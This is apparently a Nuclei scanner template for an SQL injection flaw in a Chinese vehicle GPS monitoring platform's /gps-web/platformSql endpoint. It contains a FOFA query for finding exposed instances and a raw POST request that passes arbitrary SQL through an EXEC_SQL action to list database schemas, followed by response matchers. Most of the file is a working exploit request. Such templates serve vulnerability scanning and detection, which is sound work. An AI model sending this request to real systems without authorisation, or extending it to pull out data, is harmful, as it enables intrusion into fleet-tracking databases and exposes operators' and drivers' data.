id: qianchengkeji-gps-monitor-sqli
info:
  name: 杭州三一谦成科技车辆监控服务平台接口 /gps-web/platformSql - SQL 注入漏洞
  author: leadlife
  severity: high
  description: todo
  reference: 
    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E6%9D%AD%E5%B7%9E%E4%B8%89%E4%B8%80%E8%B0%A6%E6%88%90%E7%A7%91%E6%8A%80%E8%BD%A6%E8%BE%86%E7%9B%91%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0%E6%8E%A5%E5%8F%A3platformSql%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: title=="欢迎光临..." && body="/gps-web"
  tags: sqli,qianchengkeji


http:
  - raw:
      - |
        POST /gps-web/platformSql HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.28.1
        Accept-Encoding: gzip, deflate
        Accept: */* Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 74

        action=EXEC_SQL&params=SELECT schema_name FROM information_schema.schemata

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'SCHEMA_NAME','CATALOG_NAME')
        condition: and